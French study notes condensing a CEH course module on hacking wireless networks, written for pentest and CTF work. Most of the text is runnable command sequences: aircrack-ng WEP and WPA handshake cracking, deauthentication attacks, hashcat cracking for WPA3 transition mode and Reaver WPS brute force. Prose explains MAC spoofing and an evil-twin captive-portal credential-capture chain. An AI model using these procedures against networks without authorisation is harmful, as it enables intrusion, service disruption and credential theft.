# CEH M16 - Hacking Wireless Networks (synthese offensive)

Source: `CEHv13 - Module 16 - Hacking Wireless Networks hide01.ir.pdf` (140 pages), OCR
quasi-complet: 134/140 pages (page = pagination du module lui-meme, "Module 16 Page NNN",
commence a 2440). 6 pages non recuperees apres plusieurs tentatives OCR (012-014, 023, 029,
031 dans la numerotation locale des fichiers rendus) - verifie par inspection des pages
voisines: ce sont toutes des pages de theorie pure (normes 802.11, flux EAP/RADIUS, mecanique
WEP/TKIP/PMK) sans commande offensive, donc sans impact sur cette synthese. Theorie
d'examen/countermeasures omise sauf reutilisable offensivement. Bruit OCR (watermark,
artefacts) ignore.

Structure: Wireless concepts/encryption (WEP/WPA/WPA2/WPA3) -> Wireless Threats -> Wireless
Hacking Methodology (Discovery -> Traffic Analysis -> Cracking) -> Bluetooth absent de ce
module (deplace ailleurs dans CEHv13) -> Mobile/IoT attacks hors-scope -> Countermeasures
(omis).

## 1. Chiffrements Wi-Fi - ce qu'il faut retenir pour cibler une attaque

- **WEP**: RC4, IV 24 bits en clair dans chaque paquet -> espace IV epuise en quelques heures
  sur un AP charge -> reutilisation d'IV -> cle recuperable par analyse statistique
  (FMS/korek). Cassable rapidement avec capture+injection.
- **WPA**: RC4+TKIP, 4-way handshake, cle de session rotee tous les 10 000 paquets -> plus
  resistant mais handshake capturable et crackable offline par dictionnaire.
- **WPA2**: AES-CCMP, 4-way handshake -> vulnerable au **KRACK** (key reinstallation attack,
  force la reutilisation du nonce en rejouant le message 3 du 4-way handshake) et au
  **PSK offline cracking** une fois le handshake capture.
- **WPA3**: AES-GCMP-256, SAE (Simultaneous Authentication of Equals) remplace le PSK ->
  resiste au dictionnaire offline classique, MAIS reste crackable via capture de handshake +
  conversion hcxtools + hashcat mode 22000 (cf section 3) quand le mode transition
  WPA2/WPA3 est actif (downgrade possible vers WPA2 plus faible).

## 2. Methodologie de reconnaissance Wi-Fi

```
# 1. Passer la carte en mode monitor
airmon-ng start <interface>              # ex: airmon-ng start wlan0
airmon-ng check kill                     # tue les process qui interferent (NetworkManager, wpa_supplicant)

# 2. Scanner les SSID/BSSID disponibles
airodump-ng <interface>mon

# 3. Cibler un AP precis (capture dediee, ecrit un .cap)
airodump-ng --bssid <BSSID> -c <channel> -w <ESSID> <interface>mon
```
- Outil alternatif de decouverte WPS: `wash -i <interface>` (detecte les AP avec WPS actif,
  marche aussi sur les SSID caches si Reaver est installe).
- Reveler un SSID cache: `mdk3 <interface> p -b 1 -c <channel>` (attaque de sondage/probe
  combinee a aircrack-ng).

## 3. Cracking WEP (aircrack-ng suite)

Suite complete: **airmon-ng** (mode monitor), **airodump-ng** (capture 802.11 brute + IV),
**aireplay-ng** (injection: fake auth, ARP replay, deauth), **aircrack-ng** (cracking WEP/WPA
PSK), **airdecap-ng** (retire les en-tetes wireless des frames capturees).
```
airmon-ng start eth1
airodump-ng --ivs --write capture eth1          # capture les IV WEP uniquement
aireplay-ng -1 0 -e SECRET_SSID -a <BSSID> -h <ma_MAC> <interface>mon   # fake auth / assoc
# une fois suffisamment d'IV captures:
aircrack-ng capture*.ivs                         # casse la cle WEP par analyse statistique
```
MITM via aircrack-ng: meme sequence (fake auth + deauth du client legitime pour le forcer a se
reassocier sur l'AP forge).

## 4. Cracking WPA/WPA2 (handshake + dictionnaire)

```
airmon-ng start <interface>                      # [si erreur "2 process": airmon-ng check kill]
airodump-ng <interface>                           # repere BSSID/canal de la cible
airodump-ng --bssid <BSSID> -c <CH> -w <ESSID> <interface>mon   # capture dediee -> .cap

# dans un 2e terminal: forcer la reconnexion pour capturer le 4-way handshake
aireplay-ng -0 11 -a <BSSID> -c <client_MAC> <interface>mon

# une fois le handshake capture (visible dans airodump-ng "WPA handshake"):
aircrack-ng -a2 <BSSID> -w password.txt capture*.cap
```
- `-a2` force le mode WPA (sinon aircrack-ng essaie WEP par defaut).
- Wordlist typique: `/usr/share/wordlists/rockyou.txt`.
- Deauth generique (fonctionne aussi pour forcer un handshake ou faire du DoS pur):
  `aireplay-ng --deauth 25 -h <TARGET_MAC> -b <AP_MAC> <interface>mon`

## 5. Cracking WPA3 (SAE) via hcxtools + hashcat

```
airmon-ng start <interface>
airodump-ng --bssid <BSSID> --channel <CH> --write capture <interface>mon
aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> <interface>mon      # force la reconnexion

# conversion du capture .cap -> format hashcat
hcxpcapngtool -o capture.hccapx capture.cap

# cracking dictionnaire
hashcat -m 22000 capture.hccapx /path/to/wordlist.txt
```
Piege: WPA3 pur (sans mode transition) resiste au crack offline classique grace a SAE; cette
chaine marche surtout quand le reseau accepte encore WPA2 (mode transition) ou pour auditer
une cle faible malgre SAE.

## 6. WPS PIN cracking (Reaver)

```
airmon-ng start wlan0
wash -i mon0                                      # ou wash -i wlan0 - detecte les AP WPS actifs
# si wash ne voit rien:
airodump-ng wlan0mon

reaver -i wlan0mon -b <BSSID> -vv                 # bruteforce le PIN WPS (8 chiffres, espace reduit par design)
```
Reaver exploite la faiblesse structurelle du PIN WPS (les 2 moities du PIN sont verifiees
separement par le protocole) pour recuperer la passphrase WPA/WPA2 complete sans toucher au
chiffrement lui-meme.

## 7. Fern Wifi Cracker (GUI, memes primitives qu'aircrack-ng)

```
sudo fern-wifi-cracker
```
Flux: activer Monitor Mode sur l'adaptateur -> Scan for Access Points -> selectionner la cible
WPA/WPA2 -> bouton "Attack" (declenche un deauth automatique pour forcer le handshake) ->
charger une wordlist (ex. rockyou.txt) -> "Start WPA Attack". Supporte aussi le cracking
WEP/WPS en mode graphique - utile quand la CLI n'est pas souhaitable (demo client, contrainte
de temps).

## 8. Denial of Service Wi-Fi

- **Disassociation attack**: paquet forge qui coupe un seul client de l'AP (sans le bannir
  durablement, il peut se reassocier).
- **De-authentication attack**: flood de trames deauth/disassoc forgees -> deconnecte tous les
  clients vises en boucle.
  `aireplay-ng --deauth 25 -h <TARGET_MAC> -b <AP_MAC> ath1`
- Usage offensif cle: le deauth n'est quasiment jamais une fin en soi en CTF/pentest - il sert
  de **primitive pour forcer un handshake** (sections 4/5) ou pour un **evil twin / MITM**
  (section 9).
- **Jamming RF**: brouilleurs materiels dedies (PCB-4510, CPB-2920, etc.) qui saturent la bande
  2.4/5 GHz - approche physique, hors-scope logiciel mais a connaitre pour un engagement
  physique.

## 9. Evil Twin / Rogue AP / MITM

Chaine d'attaque Evil Twin:
1. Sniffer les parametres de la victime (MAC, ESSID/BSSID, canal).
2. Monter un faux AP sur un nouveau canal avec le **meme BSSID+ESSID** que l'AP legitime
   (outil cite: **KARMA** - ecoute passive les probe requests et adopte automatiquement le SSID
   demande par le client pour paraitre familier).
3. Deauth le client sur l'AP legitime (spoofer la source = adresse de l'AP legitime) pour le
   forcer a chercher un nouvel AP valide.
4. Le client se reassocie automatiquement sur l'Evil Twin (meme SSID/MAC connu).
5. L'attaquant est maintenant en position MITM: sniff/modif de tout le trafic, capture de
   credentials sur un faux portail captif ("fake hotspot").
- Piege cote cible: SSID identique a un hotspot public connu (Starbucks, aeroport, FedEx
  Office) pour exploiter la reconnexion automatique des terminaux mobiles.

## 10. MAC Spoofing (bypass de filtrage MAC)

```
# Linux
ifconfig wlan0 down
ifconfig wlan0 hw ether 02:25:ab:4c:2a:be     # ou aa:bb:cc:dd:ee:ff au choix
ifconfig wlan0 up
```
- Outils GUI cites: **Technitium MAC Address Changer** (Windows), **LizardSystems Change MAC
  Address**.
- Usage offensif: contourner un filtrage MAC sur l'AP en usurpant la MAC d'un client deja
  autorise (necessite de deconnecter/eviter la collision avec le vrai client, souvent combine
  a un deauth cible). Variante **AP MAC spoofing**: cloner la MAC+SSID de l'AP legitime lui-meme
  pour l'Evil Twin (section 9).

## 11. Outils complementaires (mentionnes, a connaitre pour switcher rapidement)

- **Wifite**: automatise l'ensemble WEP/WPA/WPS (scan -> cible -> capture -> crack) en une
  seule commande interactive - bon reflexe quand le temps manque en CTF.
- **EAPHammer**: framework d'attaque evil-twin/portail captif orientee entreprise (802.1X).
- **Cowpatty**: recuperation de PSK WPA depuis un handshake capture (alternative a
  aircrack-ng/hashcat).
- **WEPCrack**, **WEP-key-break**: alternatives dediees WEP si aircrack-ng indisponible.
- **KisMAC / NetSpot**: discovery Wi-Fi passive sur macOS, utile en reconnaissance initiale.

## 12. KRACK (WPA2, reference rapide)

Exploite la reinstallation du nonce lors de la retransmission du message 3 du 4-way handshake
(le point d'acces peut retransmettre ce message plusieurs fois si l'ACK se perd, chaque
reinstallation remet le nonce/compteur de replay a zero) -> permet le replay/dechiffrement de
paquets ou l'injection selon la suite crypto utilisee par le client. Attaque cote protocole, pas
de commande CLI unique documentee ici - necessite un outil dedie (scripts PoC KRACK) rejouant
le message 3 en MITM.

## Gaps connus (pages non OCR, theorie pure confirmee par contexte voisin)

- 012-014: normes 802.11 (802.11ax/802.11b) - pur theorique.
- 023: mecanique WEP (reutilisation IV, Fern Wifi Cracker/WEP-key-break mentionnes mais deja
  couverts section 11).
- 029: proprietes SAE/WPA3 (resistance dictionnaire offline, forward secrecy) - theorique.
- 031: mecanique IV 24 bits WEP - deja resume section 1.
Aucune commande/outil offensif supplementaire attendu sur ces pages specifiques au vu du
contexte immediatement avant/apres chacune.
